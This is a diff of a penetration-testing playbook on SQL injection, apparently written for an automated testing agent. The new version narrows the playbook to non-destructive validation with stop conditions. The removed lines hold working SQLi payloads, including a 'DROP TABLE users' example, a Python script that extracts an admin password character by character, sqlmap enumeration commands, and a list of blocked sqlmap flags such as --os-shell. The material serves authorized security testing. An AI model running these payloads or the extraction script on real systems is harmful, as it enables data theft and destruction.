@@ -1,214 +1,58 @@
-# SQL Injection (SQLi) — Playbook
+# SQL Injection (SQLi)
 
-## Vulnerability Description
+## Scope and classification
 
-**OWASP:** A03:2021 — Injection
-**CWE:** CWE-89 (SQL Injection)
+SQL injection occurs when input changes the structure or behavior of a database
+operation. Map the test to OWASP WSTG v4.2 procedure IDs and ASVS 5.0.0
+requirements where applicable; see `skills/pentest/references/source-provenance.md`.
+This playbook is bounded to non-destructive validation on explicitly authorized
+inputs. Database enumeration, data extraction, writes, stacked statements,
+operating-system interaction, and blind extraction are out of scope unless the
+Rules of Engagement explicitly authorize the exact action and data boundary.
 
-SQL Injection occurs when untrusted user input is embedded directly into SQL queries without proper sanitization or parameterization. An attacker can manipulate the query to read, modify, or delete database content, bypass authentication, or execute administrative operations on the database server.
+## Validation
 
----
+1. Confirm the endpoint, parameter, identity, and allowed request budget.
+2. Capture a benign baseline with stable input and preserve status, relevant
+   response content, and timing.
+3. Use one minimal, inert input variation and a paired control. Keep the request
+   shape, identity, and application state constant.
+4. Repeat only as needed within the authorized budget. A database error, status
+   code, response length, timing change, or scanner alert alone is not proof.
+   Corroborate a repeatable application-visible behavior change that is
+   specific to the paired condition and does not expose unrelated data.
+5. If authorized source is supplied, trace input through parsing and query
+   construction to the handler, then compare sibling routes. Source review guides
+   the hypothesis; observed guarded behavior establishes a finding.
 
-## Types
-
-| Type | Description | Example Indicator |
-|---|---|---|
-| **Error-based** | Database error messages reveal query structure or data | `You have an error in your SQL syntax...` |
-| **Boolean-based (blind)** | True/false conditions cause different page responses | `' OR 1=1--` returns valid content, `' AND 1=2--` returns empty/error |
-| **Time-based (blind)** | Conditional queries cause measurable delays | `' OR IF(1=1,SLEEP(5),0)--` causes 5s delay |
-| **UNION-based** | `UNION SELECT` appends attacker-controlled rows to the result set | `' UNION SELECT NULL,NULL,NULL--` |
-| **Stacked queries** | Multiple statements executed sequentially (MS SQL, PostgreSQL) | `'; DROP TABLE users--` |
-
----
-
-## Detection
-
-### Manual Testing
-
-```sql
--- Basic boolean test
-' OR 1=1--
-' OR 1=2--
-
--- UNION column count enumeration
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-
--- String-based column detection
-' UNION SELECT 'a',NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-
--- Database fingerprinting
-' UNION SELECT @@version,NULL,NULL--  (MSSQL/MySQL)
-' UNION SELECT version(),NULL,NULL--   (PostgreSQL)
-
--- Error-based triggers
-' AND 1=CONVERT(int, @@version)--
-' AND 1=CAST(1 AS INT)--              (intentional type mismatch)
-
--- Time-based blind
-' OR IF(1=1,SLEEP(5),0)--             (MySQL)
-' OR pg_sleep(5)--                     (PostgreSQL)
-'; WAITFOR DELAY '0:0:5'--            (MSSQL)
-
--- Boolean-based blind detection
-# Compare response size/content between true and false conditions
-# Use a Python script to automate binary search on each character
-' AND SUBSTRING((SELECT password FROM Users LIMIT 1),1,1)='a'--
-' AND SUBSTRING((SELECT password FROM Users LIMIT 1),1,1)='b'--
-```
-
-### Blind SQLi Automation (Python)
-
-```python
-import requests, string
-
-url = "<target>/rest/products/search?q="
-chars = string.ascii_lowercase + string.digits
-extracted = ""
-
-for pos in range(1, 40):
-    for c in chars:
-        # Boolean-based: check if char at position matches
-        payload = f"apple')) OR (SELECT SUBSTR(password,{pos},1) FROM Users WHERE email='admin@test.com')='{c}'--"
-        r = requests.get(url + requests.utils.quote(payload, safe=""))
-        if '"data"' in r.text:
-            extracted += c
-            print(f"[+] Position {pos}: {c} → Current: {extracted}")
-            break
-    else:
-        break  # No more characters
-print(f"Extracted: {extracted}")
-```
-
-### Observing Responses
-
-- **Error messages**: Look for SQL syntax errors, stack traces, or DBMS version strings in HTML responses.
-- **Content differences**: Compare the response body length between true vs. false conditions.
-- **Response timing**: Measure request/response time for `SLEEP`/`WAITFOR` payloads vs. benign requests.
-
----
-
-## Tools
-
-| Tool | Usage | Notes |
-|---|---|---|
-| **sqlmap** | `sqlmap -u '<url>' --batch --risk=1 --level=1` | Read-only recon only |
-| **sqlmap (enumerate)** | `sqlmap -u '<url>' --batch --dbs` | Safe — only lists database names |
-| **sqlmap (current user)** | `sqlmap -u '<url>' --batch --current-user` | Safe — read-only |
-| **arjun** | `arjun -u '<url>' --get` | Parameter discovery |
-| **curl** | Manual payload injection | For fine-grained testing |
-
-### Virtual hosts without `/etc/hosts`
-
-When an authorized vhost does not resolve locally, connect to the in-scope IP and
-send the vhost in the request instead of editing host networking:
-
-```bash
-sqlmap -u 'http://<in-scope-ip>/<path>?<parameter>=<value>' \
-  -H 'Host: <authorized-vhost>' --batch --risk=1 --level=1
-```
-
-Save the captured request or exact working invocation as exploitation evidence.
-
-> ⚠️ **BLOCKED sqlmap flags:** `--dump` (data exfiltration), `--os-shell`, `--file-write`, `--file-read` (unless explicitly authorized).
-
----
-
-## Internet Research
-
-Use these search patterns to find real-world context:
-
-- `<product> SQLi exploit`
-- `<CVE-ID> sqli PoC`
-- `site:hackerone.com SQL injection`
-- `site:portswigger.net SQL injection`
-- `<product> sqlmap tamper script`
-
----
-
-## Safe Proof of Concept
-
-Read-only operations that prove injection without exfiltrating data:
-
-```bash
-# List databases (read-only metadata)
-sqlmap -u 'https://target.com/page?id=1' --batch --dbs
-
-# Current database user (read-only)
-sqlmap -u 'https://target.com/page?id=1' --batch --current-user
-
-# Current database name (read-only)
-sqlmap -u 'https://target.com/page?id=1' --batch --current-db
-
-# Manual boolean-based proof
-curl -s -o /dev/null -w "Time: %{time_total}\n" 'https://target.com/page?id=1%27%20OR%20SLEEP(5)--'
-```
-
----
+Do not use automated tools with extraction, mutation, shell, file, or bypass
+features. Do not assume a low tool risk setting makes a request safe. Prefer a
+manual, minimal control pair when the tool cannot guarantee the requested
+non-destructive boundary.
 
 ## Evidence
 
-Each finding should include:
-
-```
-**Vulnerability:** SQL Injection
-**URL:** https://target.com/page?id=1
-**Parameter:** id
-**Payload:** ' OR SLEEP(5)--
-**Type:** Time-based blind (MySQL)
-**Command:**
-  sqlmap -u 'https://target.com/page?id=1' --batch --current-db
-**Output:**
-  current database: 'target_db'
-**Response time with payload:** 5.02s
-**Response time without:** 0.03s
-**Remediation:** Use parameterized queries / prepared statements
-```
-
----
-
-## Evidence to Save
-
-- Tool output → `$ENG_DIR/evidence/exploitation/sqli/<finding>.*`
-- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`
-- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`
-
----
-
-## Remediation
-
-| Measure | Description |
-|---|---|
-| **Parameterized queries (prepared statements)** | Never concatenate user input into SQL strings. Use placeholders (`?`, `$1`, `:param`). |
-| **Input validation** | Whitelist allowed characters and types. Reject unexpected input server-side. |
-| **WAF (Web Application Firewall)** | Layer 7 filtering can block common SQLi payloads (defense-in-depth — not a replacement for parameterization). |
-| **Least-privilege DB user** | Application DB account should only have `SELECT` / `INSERT` / `UPDATE` on required tables — never `DROP`, `CREATE`, or administrative roles. |
-| **ORM frameworks** | Use an ORM (SQLAlchemy, Entity Framework, Hibernate) that handles parameterization automatically. |
-| **Error handling** | Never expose raw database errors to the client. Log them server-side and return a generic error page. |
-
----
+Save the exact baseline and changed requests/responses, target and parameter,
+identity, timing conditions, guard receipt, and the specific repeatable effect
+under `$ENG_DIR/evidence/exploitation/sqli/`. Redact credentials and unrelated
+data. State what the test can establish and its limits; no finite test proves
+absence.
 
 ## Stop Conditions
-- Payload causes server error/timeout → pause and assess
-- Access to sensitive data beyond scope → stop and notify
+
+- Stop on unexpected errors, latency/degradation, state changes, sensitive data,
+  or evidence that the test may execute a write or disclose unrelated records.
+- Stop if a paired control is unstable or the result depends only on timing,
+  response length, or an error message.
+- Stop before any escalation in payload behavior, automation, request rate, or
+  data access without explicit approval.
 
 ## Blocked Actions
 
-The following are **never** permitted during authorized testing unless explicitly approved in writing:
-
-| Action | Risk |
-|---|---|
-| `--dump` tables/data | Data exfiltration |
-| `--os-shell` | Full server compromise |
-| `--file-write` | Writing webshells or malicious files |
-| `--file-read` (without explicit scope) | Reading sensitive files |
-| `DROP TABLE/DB` | Destructive data loss |
-| `DELETE` / `UPDATE` (destructive) | Data modification |
-| `INSERT` (malicious) | Data injection |
-| Stacked queries on production | Uncontrolled impact |
----
+- Credential or database extraction, table/database enumeration, data dumps,
+  destructive or modifying statements, stacked statements, file access, shell
+  access, and unapproved automated exploitation.
+- Blind character-by-character extraction, high-volume payload sweeps, and
+  evasion or WAF bypass recipes.
+- Claiming SQLi from a status code, timing delta, length change, generic error,
+  or tool output without a decisive, controlled behavior change.
